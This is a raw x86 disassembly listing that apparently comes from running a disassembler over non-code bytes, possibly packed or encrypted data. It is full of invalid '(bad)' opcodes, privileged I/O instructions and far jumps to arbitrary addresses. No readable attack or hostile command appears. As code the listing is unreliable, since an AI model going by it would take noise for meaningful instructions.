  41fe40:	and    DWORD PTR [esi-0x52],ecx
  41fe43:	sub    al,BYTE PTR [esi-0x3836fd8b]
  41fe49:	mov    eax,0x68a4650f
  41fe4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe4f:	iret   
  41fe50:	mov    DWORD PTR [ebp+0x4ec26f85],edi
  41fe56:	leave  
  41fe57:	dec    eax
  41fe58:	mov    ds:0x442dbbe,al
  41fe5d:	enter  0x88c,0xeb
  41fe61:	or     ch,BYTE PTR [edx-0x281c1a77]
  41fe67:	test   al,0xa5
  41fe69:	mov    esi,0x6ecfc3fb
  41fe6e:	push   ss
  41fe6f:	scas   eax,DWORD PTR es:[edi]
  41fe70:	les    ebp,FWORD PTR [esi-0x49]
  41fe73:	outs   dx,DWORD PTR ds:[esi]
  41fe74:	scas   eax,DWORD PTR es:[edi]
  41fe75:	or     BYTE PTR [ecx],al
  41fe77:	sbb    al,dh
  41fe79:	mov    bl,0xa7
  41fe7b:	dec    esi
  41fe7c:	mov    DWORD PTR [esi-0x5],edx
  41fe7f:	rcl    esp,0x27
  41fe82:	and    DWORD PTR [ecx+0x2dd55683],ecx
  41fe88:	repnz das 
  41fe8a:	mov    ds:0x728270dd,al
  41fe8f:	mov    bl,0xf5
  41fe91:	fwait
  41fe92:	inc    ebp
  41fe93:	sahf   
  41fe94:	fld    DWORD PTR [ebx-0x26]
  41fe97:	cmp    ah,bh
  41fe99:	das    
  41fe9a:	jmp    0x2e90:0x9f73158b
  41fea1:	push   ecx
  41fea2:	xchg   DWORD PTR [edx+0x2d],ecx
  41fea5:	jmp    0x389d:0x4e25301e
  41feac:	ror    DWORD PTR [edi],0x3d
  41feaf:	cmc    
  41feb0:	ss ds cli 
  41feb3:	(bad)  
  41feb5:	and    BYTE PTR [ecx+0x2c971ba7],0x9f
  41febc:	sti    
  41febd:	sbb    ebp,DWORD PTR [edx+edx*2]
  41fec0:	pop    es
  41fec1:	mov    edi,0xf0e4f99d
  41fec6:	aas    
  41fec7:	mov    bl,0xfb
  41fec9:	fmul   st,st(0)
  41fecb:	mov    ds:0xd3f02e17,eax
  41fed0:	(bad)  
  41fed2:	push   ebx
  41fed3:	cmp    al,0xbf
  41fed5:	jmp    FWORD PTR [edi+ecx*8]
  41fed8:	mov    edi,0x9f5b8b70
  41fedd:	mov    ebp,0x3d3cdc0
  41fee2:	pop    edi
  41fee3:	jg     0x41feb2
  41fee5:	aas    
  41fee6:	jecxz  0x41fea5
  41fee8:	scas   eax,DWORD PTR es:[edi]
  41fee9:	std    
  41feea:	pop    esi
  41feeb:	(bad)  
  41feec:	in     al,0xde
  41feee:	pop    ds
  41feef:	repz xchg ebp,eax
  41fef1:	ret    
  41fef2:	aas    
  41fef3:	shl    DWORD PTR [edi],0x9
  41fef6:	cmp    dh,BYTE PTR [ecx-0x68]
  41fef9:	add    eax,0xbedf127a
  41fefe:	not    DWORD PTR [edx+ebx*2]
  41ff01:	(bad)  
  41ff02:	jmp    0x41fea3
  41ff04:	mov    ebp,0x3f56aca
  41ff09:	jo     0x41fefc
  41ff0b:	imul   ecx,esi,0xdec53d9f
  41ff11:	leave  
  41ff12:	add    eax,0x1fd9efa9
  41ff17:	xchg   ebp,eax
  41ff18:	arpl   bx,si
  41ff1a:	test   al,0x3f
  41ff1c:	ins    DWORD PTR es:[edi],dx
  41ff1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff1e:	dec    ecx
  41ff1f:	mov    DWORD PTR [edx],esp
  41ff21:	inc    edx
  41ff22:	push   esi
  41ff23:	and    eax,0x90fb0f8b
  41ff28:	mov    dh,0xbb
  41ff2a:	mov    esi,0x33f354ea
  41ff2f:	mov    WORD PTR [ecx+eax*4+0x24],ss
  41ff33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff34:	mov    ah,0x95
  41ff36:	fist   DWORD PTR [edx]
  41ff38:	ret    
  41ff39:	xor    DWORD PTR [ebp-0x4e],esp
  41ff3c:	xchg   edi,eax
  41ff3d:	inc    esi
  41ff3e:	(bad)  
  41ff3f:	cmp    cl,dh
  41ff41:	daa    
  41ff42:	adc    al,dh
  41ff44:	push   0x8db3643e
  41ff49:	mov    ecx,0x50f22e22
  41ff4e:	rcl    ch,0xa8
  41ff51:	jecxz  0x41ff0a
  41ff53:	sbb    bh,BYTE PTR [ebx+0x6cd6235a]
  41ff59:	pop    edx
  41ff5a:	hlt    
  41ff5b:	sub    edx,ebp
  41ff5d:	(bad)  
  41ff5e:	dec    edi
  41ff5f:	cmp    esi,0x54709c45
  41ff65:	cmc    
  41ff66:	jg     0x41fefb
  41ff68:	mov    ch,0x68
  41ff6a:	ins    BYTE PTR es:[edi],dx
  41ff6b:	push   ebx
  41ff6c:	adc    al,0x6d
  41ff6e:	in     eax,0x3a
  41ff70:	imul   esp
  41ff72:	cmp    bl,BYTE PTR [edi-0x10974cc1]
  41ff78:	aad    0x89
  41ff7a:	mov    bl,0x10
  41ff7c:	xor    esi,DWORD PTR [edx+esi*2]
  41ff7f:	nop
  41ff80:	mov    dh,0x1b
  41ff82:	and    cl,ch
  41ff84:	ins    BYTE PTR es:[edi],dx
  41ff85:	or     ah,BYTE PTR [eax-0x4f]
  41ff88:	pop    ds
  41ff89:	iret   
  41ff8a:	fbld   TBYTE PTR [edx]
  41ff8c:	ins    DWORD PTR es:[edi],dx
  41ff8d:	sbb    ecx,edi
  41ff8f:	in     al,dx
  41ff90:	sbb    BYTE PTR [edx+edi*1+0x30],ah
  41ff94:	ins    DWORD PTR es:[edi],dx
  41ff95:	sti    
  41ff96:	scas   al,BYTE PTR es:[edi]
  41ff97:	(bad)  
  41ff98:	cmp    al,0x6b
  41ff9a:	push   es
  41ff9b:	fisub  DWORD PTR [eax-0x6e]
  41ff9e:	xchg   BYTE PTR [eax+0x24],bl
  41ffa1:	or     al,0x5c
  41ffa3:	mov    bh,0xc8
  41ffa5:	cmp    eax,0xd450348b
  41ffaa:	lahf   
  41ffab:	daa    
  41ffac:	xor    al,0x82
  41ffae:	je     0x41ff5b
  41ffb0:	inc    edx
  41ffb1:	cmp    BYTE PTR [edi-0x39],0xfb
  41ffb5:	push   esp
  41ffb6:	sub    esi,0xb4272689
  41ffbc:	mov    bl,0xd7
  41ffbe:	jno    0x420034
  41ffc0:	jo     0x41ffae
  41ffc2:	lahf   
  41ffc3:	(bad)  
  41ffc4:	jne    0x420025
  41ffc6:	mov    al,ds:0xeb0e07ac
  41ffcb:	xchg   BYTE PTR [edx+0x3b4bd819],bh
  41ffd1:	hlt    
  41ffd2:	leave  
  41ffd3:	push   ecx
  41ffd4:	ins    DWORD PTR es:[edi],dx
  41ffd5:	lea    esp,[ebx-0x5d]
  41ffd8:	cmp    bh,BYTE PTR [eax-0x69]
  41ffdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffdc:	leave  
  41ffdd:	xor    al,0x93
  41ffdf:	rol    BYTE PTR [eax+edx*4-0x52],0xa3
  41ffe4:	(bad)
  41ffe8:	adc    eax,DWORD PTR [ebp-0x3c176b75]
  41ffee:	data16 cli 
  41fff0:	dec    esi
  41fff1:	xor    DWORD PTR [ebx+0x48],ecx
  41fff4:	out    0x3,eax
  41fff6:	outs   dx,BYTE PTR ds:[esi]
  41fff7:	mov    dl,0x19
  41fff9:	inc    ebx
  41fffa:	lock dec eax
  41fffc:	arpl   bp,si
  41fffe:	je     0x41ffe7
  420000:	ret    0x5f9b
  420003:	out    0x85,al
  420005:	dec    edi
  420006:	mov    edi,0xb1346de9
  42000b:	ret    0x70ab
  42000e:	jnp    0x420055
  420010:	push   cs
  420011:	loopne 0x420056
  420013:	and    BYTE PTR [edi-0x10],bh
  420016:	mov    bh,0x3f
  420018:	ja     0x41ffe8
  42001a:	lods   al,BYTE PTR ds:[esi]
  42001b:	ds es pop ebp
  42001e:	mov    ?,edx
  420020:	lahf   
  420021:	inc    edi
  420022:	inc    esp
  420023:	stos   DWORD PTR es:[edi],eax
  420024:	mov    dl,BYTE PTR [esi]
  420026:	iret   
  420027:	jg     0x41ffe5
  420029:	and    DWORD PTR [edx+esi*4+0x1b61f1dc],esp
  420030:	xor    BYTE PTR [edi],al
  420032:	mov    BYTE PTR [edx-0x48b997bf],ch
  420038:	mov    WORD PTR [ecx],ds
  42003a:	xchg   esp,eax
  42003b:	stos   BYTE PTR es:[edi],al
  42003c:	aam    0x95
  42003e:	xchg   edx,eax
  42003f:	(bad)  
  420040:	mov    esi,?
  420042:	adc    eax,0xa789f846
  420047:	ffreep st(1)
  420049:	scas   eax,DWORD PTR es:[edi]
  42004a:	jge    0x42004a
  42004c:	idiv   DWORD PTR [eax]
  42004e:	dec    ebx
  420050:	jmp    DWORD PTR [ecx]
  420052:	jmp    0x420008
  420054:	add    ebp,DWORD PTR [ecx+0x1]
  420057:	pop    ebp
  420058:	out    0xea,al
  42005a:	imul   ebp,DWORD PTR [esi-0x480c0d10],0x48
  420061:	mov    edi,0xfc32eff7
  420066:	xor    ecx,0xcf2313b5
  42006c:	std    
  42006d:	rcr    bh,0xe1
  420070:	pop    ebp
  420071:	scas   eax,DWORD PTR es:[edi]
  420072:	jmp    FWORD PTR [esi]
  420074:	outs   dx,BYTE PTR ds:[esi]
  420075:	jg     0x42005d
  420077:	das    
  420078:	and    ah,ch
  42007a:	bound  esi,QWORD PTR [edi+0x3e17dd05]
  420080:	stc    
  420081:	shl    BYTE PTR [ebp-0x22],cl
  420084:	lock mul BYTE PTR [ebx]
  420087:	fdivrp st(7),st
  420089:	enter  0xf9eb,0xfa
  42008d:	icebp  
  42008e:	push   edi
  42008f:	js     0x42008f
  420091:	clc    
  420092:	and    eax,0x8bd32eba
  420097:	mov    cl,0x29
  420099:	xchg   ebp,eax
  42009a:	xlat   BYTE PTR ds:[ebx]
  42009b:	pushf  
  42009c:	jge    0x4200cb
  42009e:	pop    edi
  42009f:	jmp    DWORD PTR [ebx-0x20c41c6f]
  4200a5:	add    eax,0xd9c53d0f
  4200aa:	shl    DWORD PTR [edi],cl
  4200ac:	cmp    BYTE PTR [ebp+0x7a],bh
  4200af:	xchg   DWORD PTR [ebx+0x60],esp
  4200b2:	sub    al,0x35
  4200b4:	or     bl,bl
  4200b6:	inc    esp
  4200b7:	push   edx
  4200b8:	mov    bh,0x54
  4200ba:	inc    ecx
  4200bb:	inc    edx
  4200bc:	cdq    
  4200bd:	data16 adc al,0x4b
  4200c0:	push   cs
  4200c1:	aad    0xc5
  4200c3:	sbb    ecx,edi
  4200c5:	add    al,0x90
  4200c7:	mov    esp,0xa3abee3e
  4200cc:	ins    BYTE PTR es:[edi],dx
  4200cd:	retf   0xad49
  4200d0:	or     BYTE PTR [ecx],ch
  4200d2:	cmp    ecx,ebx
  4200d4:	aam    0x5
  4200d6:	inc    ebp
  4200d7:	pop    esi
  4200d8:	add    BYTE PTR [edi],0xc8
  4200db:	add    DWORD PTR [edi+0x55],eax
  4200de:	cwde   
  4200df:	sub    al,BYTE PTR ds:0xa4a45999
  4200e5:	loop   0x4200ec
  4200e7:	adc    esi,DWORD PTR [edi-0x5b]
  4200ea:	lods   eax,DWORD PTR ds:[esi]
  4200eb:	pop    esi
  4200ec:	out    dx,al
  4200ed:	aas    
  4200ee:	push   edi
  4200ef:	inc    edx
  4200f0:	pop    ebx
  4200f1:	adc    cl,dh
  4200f3:	addr16 push 0xc074e7c4
  4200f9:	mov    ebp,0x851be7cc
  4200fe:	cld    
  4200ff:	jae    0x42016c
  420101:	inc    eax
  420102:	hlt    
  420103:	test   dh,al
  420105:	dec    esp
  420106:	add    BYTE PTR [ebx],cl
  420108:	clc    
  420109:	push   ds
  42010a:	(bad)  
  42010b:	aad    0x56
  42010d:	lock das 
  42010f:	icebp  
  420110:	jg     0x4200ad
  420112:	and    DWORD PTR [edi-0x66ce6927],edi
  420118:	inc    esi
  420119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42011a:	mov    dh,0x50
  42011c:	add    BYTE PTR [esi-0x33ac5737],ah
  420122:	movzx  ebx,dx
  420125:	and    dh,BYTE PTR [ecx-0x74bd4c87]
  42012b:	lock jno 0x42017b
  42012e:	mov    ah,0x9d
  420130:	push   es
  420131:	lods   eax,DWORD PTR ds:[esi]
  420132:	fild   WORD PTR [eax-0x59]
  420135:	xlat   BYTE PTR ds:[ebx]
  420136:	mov    bh,0xd9
  420138:	test   esp,0x78d12235
  42013e:	daa    
  42013f:	pop    ebx
  420140:	cli    
  420141:	add    DWORD PTR [esi],0xffffffe4
  420144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420145:	and    BYTE PTR [esi+0x2a3a1245],bh
  42014b:	cmc    
  42014c:	xlat   BYTE PTR ds:[ebx]
  42014d:	fadd   DWORD PTR [esi]
  42014f:	ss in  eax,dx
  420151:	addr16 out 0x3d,eax
  420154:	out    dx,al
  420155:	ja     0x420123
  420157:	inc    dx
  420159:	into   
  42015a:	mov    DWORD PTR [ebx-0x42b0ea7d],esp
  420160:	jge    0x4200f9
  420162:	sbb    eax,ebx
  420164:	mov    bl,0x9c
  420166:	sbb    eax,0x90f5ac37
  42016b:	scas   al,BYTE PTR es:[edi]
  42016c:	or     cl,bl
  42016e:	mov    esi,0x474a2a07
  420173:	rol    DWORD PTR [edi],0xd5
  420176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420177:	fsub   DWORD PTR [ebp+0x5661aa30]
  42017d:	adc    ecx,ecx
  42017f:	je     0x42013e
  420181:	mov    al,0x63
  420183:	dec    ebx
  420184:	push   es
  420185:	lods   eax,DWORD PTR ds:[esi]
  420186:	aam    0xba
  420188:	rol    esi,0xa
  42018b:	fnstenv ds:0x1abb2929
  420191:	xor    cl,bl
  420193:	call   0xa3f3992d
  420198:	cs inc esi
  42019a:	mov    WORD PTR [ecx],fs
  42019c:	stos   BYTE PTR es:[edi],al
  42019d:	cmp    bl,BYTE PTR [ecx+0x19b05bbe]
  4201a3:	xor    edi,DWORD PTR [ebx+0x16475c4f]
  4201a9:	jecxz  0x420180
  4201ab:	dec    edi
  4201ac:	call   edi
  4201ae:	mov    edi,0xddff24f9
  4201b3:	(bad)  
  4201b5:	in     eax,0x95
  4201b7:	fsubr  DWORD PTR [esi-0x45]
  4201ba:	mov    ebp,0xd6e00e62
  4201bf:	repz das 
  4201c1:	mov    edi,0x8a524459
  4201c6:	std    
  4201c7:	push   0x5362ab04
  4201cc:	xor    bl,BYTE PTR [ecx-0x5e953110]
  4201d2:	cmp    esp,DWORD PTR [ecx]
  4201d4:	sar    DWORD PTR [esi],cl
  4201d6:	stc    
  4201d7:	pop    edx
  4201d8:	sub    dl,BYTE PTR [edx-0x3c]
  4201db:	dec    ebx
  4201dc:	dec    esi
  4201dd:	xchg   edx,eax
  4201de:	mov    ds:0x5e453aed,al
  4201e3:	sub    DWORD PTR [eax+0x69],esp
  4201e6:	cli    
  4201e7:	je     0x420250
  4201e9:	pop    ss
  4201ea:	jnp    0x4201c8
  4201ec:	sub    eax,DWORD PTR [edi+0x7fdffcec]
  4201f2:	or     eax,0x8f43c752
  4201f7:	ds add al,0x8b
  4201fa:	sahf   
  4201fb:	aam    0x25
  4201fd:	lods   al,BYTE PTR ds:[esi]
  4201fe:	sbb    dl,BYTE PTR [edi-0x61]
  420201:	mov    edx,0x24b0920c
  420206:	pop    esp
  420207:	jnp    0x4201ea
  420209:	ss cmc 
  42020b:	xchg   ebx,eax
  42020c:	jg     0x420191
  42020e:	(bad)  
  420210:	ret    
  420211:	jmp    0x4201bb
  420213:	or     dl,BYTE PTR [edi-0x61]
  420216:	mov    esi,0xc67bea40
  42021b:	push   edx
  42021c:	mov    ecx,0x73e3bd75
  420221:	lahf   
  420222:	clc    
  420223:	dec    ecx
  420224:	cs jg  0x42021e
  420227:	inc    edx
  420229:	rcl    DWORD PTR [edi],cl
  42022b:	lahf   
  42022c:	loop   0x42020b
  42022e:	xchg   edi,eax
  42022f:	jg     0x4201b1
  420231:	pop    edi
  420232:	mov    ecx,0xad6e71fe
  420237:	outs   dx,BYTE PTR ds:[esi]
  420238:	xchg   ebx,eax
  420239:	inc    esp
  42023a:	js     0x4202b4
  42023c:	icebp  
  42023d:	xor    BYTE PTR [edi],bl
  42023f:	(bad)  
  420240:	fidivr DWORD PTR ds:0xec63ece4
  420246:	popf   
  420247:	fsubr  st(3),st
  420249:	aam    0xc9
  42024b:	sbb    eax,0xd0e5468e
  420250:	jo     0x4201d4
  420252:	mov    edx,DWORD PTR cs:[edi+0x36]
  420256:	cmp    bh,BYTE PTR [edi-0x295f3a88]
  42025c:	adc    BYTE PTR [ebx],cl
  42025e:	mov    ch,0xae
  420260:	mov    ch,0x2c
  420262:	push   ebx
  420263:	(bad)  
  420264:	fcmovnb st,st(4)
  420266:	sub    ecx,DWORD PTR [eax]
  420268:	cwde   
  420269:	add    esp,DWORD PTR [edi+ecx*1]
  42026c:	xor    BYTE PTR [edx-0x1c],ah
  42026f:	call   0x87db2223
  420274:	pusha  
  420275:	and    al,0xf1
  420277:	push   ecx
  420278:	push   edx
  420279:	ins    DWORD PTR es:[edi],dx
  42027a:	push   0x75
  42027c:	mov    ecx,esp
  42027e:	fsubp  st(3),st
  420280:	das    
  420281:	push   ecx
  420282:	push   ds
  420283:	xor    al,0x6
  420285:	mov    dh,0xc7
  420287:	pusha  
  420288:	sti    
  420289:	gs pop edi
  42028b:	and    BYTE PTR [esi+0x5e474766],dh
  420291:	inc    esp
  420292:	ss adc eax,0x45818c1f
  420298:	jns    0x4202cb
  42029a:	push   eax
  42029b:	add    DWORD PTR [ebx+0x11],ebx
  42029e:	push   ebp
  42029f:	push   esp
  4202a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202a1:	xor    ah,BYTE PTR [edx-0x66]
  4202a4:	dec    edx
  4202a5:	mov    ecx,esp
  4202a7:	mov    bh,BYTE PTR [ebp+0x1a61df12]
  4202ad:	and    al,0xe0
  4202af:	imul   ebx,DWORD PTR [eax*4-0x5b1dd3a8],0x9a32a4dd
  4202ba:	cmp    al,0x4
  4202bc:	icebp  
  4202bd:	cmp    DWORD PTR [esp+esi*1+0x7cfde29a],edi
  4202c4:	cmp    DWORD PTR [ecx+0x359e644e],ebp
  4202ca:	sahf   
  4202cb:	sbb    BYTE PTR [ecx],0x49
  4202ce:	dec    esp
  4202cf:	xchg   BYTE PTR [ecx-0x4dec0b9b],bh
  4202d5:	mov    BYTE PTR [edx],dl
  4202d7:	mov    cl,0x6c
  4202d9:	add    eax,0x7bde9b6e
  4202de:	dec    BYTE PTR [eax]
  4202e0:	(bad)  
  4202e1:	scas   eax,DWORD PTR es:[edi]
  4202e2:	int    0x1f
  4202e4:	test   eax,0xcab65f7d
  4202e9:	mov    eax,ds:0x8126b3a6
  4202ee:	in     eax,dx
  4202ef:	out    dx,eax
  4202f0:	pop    es
  4202f1:	addr16 das 
  4202f3:	in     al,dx
  4202f4:	add    BYTE PTR [eax],dh
  4202f6:	push   cs
  4202f7:	test   edi,ebp
  4202f9:	sti    
  4202fa:	xchg   edi,eax
  4202fb:	into   
  4202fc:	icebp  
  4202fd:	int3   
  4202fe:	loope  0x4202f3
  420300:	mov    esp,0x52498ed6
  420305:	cmp    ebp,ebx
  420307:	in     eax,dx
  420308:	mov    cl,0x10
  42030a:	inc    edi
  42030b:	mov    ebx,0x454a5186
  420310:	aad    0xa7
  420312:	dec    edi
  420313:	scas   eax,DWORD PTR es:[edi]
  420314:	jmp    0xd163:0x416b186
  42031b:	mov    ecx,0xc1d33fb6
  420320:	mov    al,0xa1
  420322:	xchg   esp,eax
  420323:	sbb    BYTE PTR [ebx+0x276a4e6e],ch
  420329:	adc    ah,BYTE PTR [ebx-0x74]
  42032c:	xchg   ebx,eax
  42032d:	fist   WORD PTR [ebp+eiz*4-0x72]
  420331:	mov    ebp,eax
  420333:	mov    al,0x21
  420335:	das    
  420336:	cmp    cl,BYTE PTR [ebp+eax*1-0x271f4b75]
  42033d:	(bad)  
  42033e:	test   al,0x8
  420340:	sbb    ecx,DWORD PTR [esi-0x22f82c70]
  420346:	out    0xf6,al
  420348:	into   
  420349:	jnp    0x4202cc
  42034b:	push   edi
  42034c:	lds    eax,FWORD PTR [ecx]
  42034e:	cmp    al,0x30
  420350:	pop    es
  420351:	jo     0x420348
  420353:	jmp    0x6cd9:0x4802f955
  42035a:	fimul  WORD PTR [ebx-0x1797a768]
  420360:	cmp    eax,0x1092f207
  420365:	xchg   ebp,eax
  420366:	pop    ecx
  420367:	ins    BYTE PTR es:[edi],dx
  420368:	(bad)  
  420369:	(bad)  
  42036a:	lods   eax,DWORD PTR ds:[esi]
  42036b:	cmc    
  42036c:	retf   
  42036d:	rol    DWORD PTR ds:0x4e06ac3b,cl
  420373:	popf   
  420374:	cmp    BYTE PTR [ebx],bl
  420376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420377:	mov    edi,ss
  420379:	in     eax,0x93
  42037b:	fs pop ss
  42037d:	cli    
  42037e:	adc    al,0xc7
  420380:	scas   eax,DWORD PTR es:[edi]
  420381:	sbb    dl,BYTE PTR [edi-0x28]
  420384:	inc    ebx
  420385:	daa    
  420386:	cs jo  0x420384
  420389:	fimul  DWORD PTR [edx]
  42038b:	mov    cl,0x9e
  42038d:	xchg   DWORD PTR [esi],ebx
  42038f:	mov    ebp,0xcee11242
  420394:	lea    esp,[ebx+0x6e]
  420397:	pop    esi
  420398:	pop    edi
  420399:	lds    ebx,FWORD PTR [edi+0x59df6e63]
  42039f:	shl    DWORD PTR [ebp-0x67],cl
  4203a2:	xchg   DWORD PTR [edi-0x54463b42],ebx
  4203a8:	out    0x39,eax
  4203aa:	popf   
  4203ab:	ffreep st(0)
  4203ad:	mov    ecx,0xe100a70b
  4203b2:	fisubr WORD PTR [edx+0x64]
  4203b5:	addr16 fyl2x 
  4203b8:	shl    bl,1
  4203ba:	pop    ss
  4203bb:	xchg   ecx,eax
  4203bc:	int    0x1e
  4203be:	aaa    
  4203bf:	dec    cl
  4203c1:	iret   
  4203c2:	repnz int3 
  4203c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c5:	dec    BYTE PTR [edi+ebx*1]
  4203c8:	stc    
  4203c9:	cli    
  4203ca:	scas   eax,DWORD PTR es:[edi]
  4203cb:	repnz into 
  4203cd:	repz aas 
  4203cf:	(bad)  
  4203d0:	leave  
  4203d1:	dec    BYTE PTR [ebx+ebp*2-0x464ecc00]
  4203d8:	imul   DWORD PTR [eax]
  4203da:	mov    dh,0x3c
  4203dc:	retf   
  4203dd:	into   
  4203de:	outs   dx,BYTE PTR ds:[esi]
  4203df:	iret   
  4203e0:	pop    edx
  4203e1:	loope  0x420443
  4203e3:	lock pushf 
  4203e5:	ds add eax,0x316629a9
  4203eb:	or     BYTE PTR [ebx],dh
  4203ed:	dec    eax
  4203ee:	inc    esp
  4203ef:	jae    0x4203e2
  4203f1:	iret   
  4203f2:	sbb    BYTE PTR [edx+0x67],dh
  4203f5:	pop    edi
  4203f6:	add    ebp,ebp
  4203f8:	and    eax,0x481aad3b
  4203fd:	fidivr DWORD PTR [ebx-0x51d4a4f6]
  420403:	sub    DWORD PTR [edx+ecx*1+0x6b029463],edx
  42040a:	shl    ah,0x12
  42040d:	stc    
  42040e:	jp     0x42039d
  420410:	fist   WORD PTR ds:0x870490b3
  420416:	push   eax
  420417:	dec    eax
  420418:	ins    DWORD PTR es:[edi],dx
  420419:	sbb    dl,BYTE PTR [edx+ebp*2+0x6729bd5]
  420420:	pushf  
  420421:	cmp    esi,DWORD PTR [eax]
  420423:	lea    esi,[esi]
  420425:	loop   0x420407
  420427:	and    DWORD PTR [esi+0xd],eax
  42042a:	aam    0x10
  42042c:	mov    esp,0x900b88c0
  420431:	push   0x75
  420433:	cwde   
  420434:	scas   al,BYTE PTR es:[edi]
  420435:	or     eax,0xd026d6e6
  42043a:	or     esi,edi
  42043c:	ret    0x4a74
  42043f:	fstp   st(2)
  420441:	arpl   WORD PTR [ecx+eiz*1+0x6aa06890],bp
  420448:	jmp    0xe6037308
  42044d:	(bad)  
  42044e:	adc    DWORD PTR [eax],edi
  420450:	scas   eax,DWORD PTR es:[edi]
  420451:	or     dh,BYTE PTR [ebx+0x4c]
  420454:	outs   dx,BYTE PTR ds:[esi]
  420455:	adc    BYTE PTR [edx+0x6c4fb882],bh
  42045b:	call   0xbc25:0xc360e7fb
  420462:	into   
  420463:	dec    ebp
  420464:	ss ins BYTE PTR es:[edi],dx
  420466:	fist   WORD PTR [eax+0x4c]
  420469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42046a:	dec    edi
  42046b:	dec    ebp
  42046c:	mov    ch,0xc3
  42046e:	push   esi
  42046f:	test   BYTE PTR [esi-0x352036e4],cl
  420475:	and    bh,al
  420477:	mov    ah,0xc7
  420479:	xor    esp,DWORD PTR [ebx+0x53b6f68b]
  42047f:	sbb    DWORD PTR [eax],ebx
  420481:	call   0x8890:0x343518ec
  420488:	dec    ebp
  420489:	mov    es,WORD PTR ds:0xcea7124c
  42048f:	hlt    
  420490:	hlt    
  420491:	or     edi,DWORD PTR [eax+0x501df2f1]
  420497:	jecxz  0x42047e
  420499:	stos   DWORD PTR es:[edi],eax
  42049a:	pop    ds
  42049b:	in     eax,0x91
  42049d:	mov    ah,0x6
  42049f:	lods   eax,DWORD PTR ds:[esi]
  4204a0:	in     al,dx
  4204a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204a2:	pop    ebp
  4204a3:	xchg   edx,eax
  4204a4:	or     DWORD PTR [ebx+0xf1be256],ebx
  4204aa:	sbb    DWORD PTR [ebp+0x4d],esi
  4204ad:	rol    edx,1
  4204af:	inc    esi
  4204b0:	inc    edi
  4204b1:	xchg   BYTE PTR [edx],dh
  4204b3:	mov    dl,0x19
  4204b5:	(bad)  
  4204b6:	or     al,0xc3
  4204b8:	(bad)  
  4204b9:	xchg   edi,eax
  4204ba:	mov    WORD PTR [ebx+eax*8+0x54],ss
  4204be:	call   0xb2d04c36
  4204c3:	push   ds
  4204c4:	sbb    BYTE PTR [ebp-0x75393f2],ah
  4204ca:	jo     0x420463
  4204cc:	fs push 0xc656a11a
  4204d2:	mov    dl,0x66
  4204d4:	sub    al,0x25
  4204d6:	inc    esi
  4204d7:	stos   BYTE PTR es:[edi],al
  4204d8:	cmp    DWORD PTR [edx-0x28],eax
  4204db:	pop    ecx
  4204dc:	cs pop eax
  4204de:	cs xor ch,cl
  4204e1:	jmp    0x507a:0xef296a35
  4204e8:	mov    ebx,0x83dbe6fd
  4204ed:	xchg   ebx,eax
  4204ee:	and    BYTE PTR [esi-0x44],0xf1
  4204f2:	adc    ecx,DWORD PTR [eax]
  4204f4:	test   DWORD PTR [edi+0x49],esi
  4204f7:	dec    esi
  4204f8:	xchg   edx,eax
  4204f9:	mov    dl,0xe7
  4204fb:	(bad)  
  4204fc:	push   ss
  4204fd:	pop    ss
  4204fe:	nop
  4204ff:	call   0x4262:0xe0ed5113
  420506:	std    
  420507:	rol    BYTE PTR [ebp+0x57],cl
  42050a:	(bad)  
  42050b:	es inc ebx
  42050d:	rdpmc  
  42050f:	stos   BYTE PTR es:[edi],al
  420510:	xor    DWORD PTR [edx],esp
  420512:	and    DWORD PTR [esi+0x0],esp
  420515:	call   0x229a:0x630ab540
  42051c:	cwde   
  42051d:	sbb    eax,0xb9385583
  420522:	cmp    ch,bh
  420524:	mov    ecx,0x6fb72894
  420529:	sbb    al,0x7b
  42052b:	jne    0x4204ce
  42052d:	(bad)  
  42052e:	fdiv   st(2),st
  420530:	push   edx
  420531:	sbb    DWORD PTR [edi+0x1c6e37c2],eax
  420537:	mov    cl,0x7f
  420539:	xor    al,bh
  42053b:	ret    0x134f
  42053e:	push   es
  42053f:	fndisi(8087 only) 
  420541:	(bad)  
  420543:	enter  0x2830,0x37
  420547:	push   cs
  420548:	or     ebx,DWORD PTR [ebp-0x69]
  42054b:	js     0x420545
  42054d:	xor    eax,0xe4f2b897
  420552:	gs in  al,dx
  420554:	clc    
  420555:	xor    al,0xeb
  420557:	(bad)  
  420559:	xor    BYTE PTR [edi-0x36206408],bh
  42055f:	dec    edi
  420560:	pop    edi
  420561:	(bad)  
  420562:	push   edi
  420563:	mov    ds:0x75f0e884,eax
  420568:	mov    cl,0xe8
  42056a:	leave  
  42056b:	jge    0x42053c
  42056d:	rcl    DWORD PTR [eax-0x57],1
  420570:	aad    0xc7
  420572:	xchg   ecx,eax
  420573:	(bad)  
  420574:	out    0x70,al
  420576:	mov    esi,0x635ead46
  42057b:	dec    eax
  42057c:	arpl   WORD PTR fs:[ebp+eiz*2-0x69159735],cx
  420584:	mov    cl,0xd4
  420586:	xor    BYTE PTR [esi-0x562bb156],dh
  42058c:	outs   dx,BYTE PTR ds:[esi]
  42058d:	sbb    DWORD PTR ds:0x1d67a8cd,edi
  420593:	inc    eax
  420594:	xor    DWORD PTR [ebx+0x1506e71e],ebx
  42059a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42059b:	mov    ds:0xf3219ec5,al
  4205a0:	inc    esi
  4205a1:	and    al,0x8d
  4205a3:	lahf   
  4205a4:	lods   eax,DWORD PTR ds:[esi]
  4205a5:	stos   BYTE PTR es:[edi],al
  4205a6:	dec    edi
  4205a7:	std    
  4205a8:	fldenv [edx]
  4205aa:	sbb    BYTE PTR [edi-0x1a],al
  4205ad:	(bad)  
  4205ae:	cld    
  4205af:	ror    BYTE PTR [ebx+esi*1],cl
  4205b2:	mov    WORD PTR [ebx+0x35],ds
  4205b5:	xchg   BYTE PTR [ebp+0x26ae88c4],al
  4205bb:	adc    al,0xb2
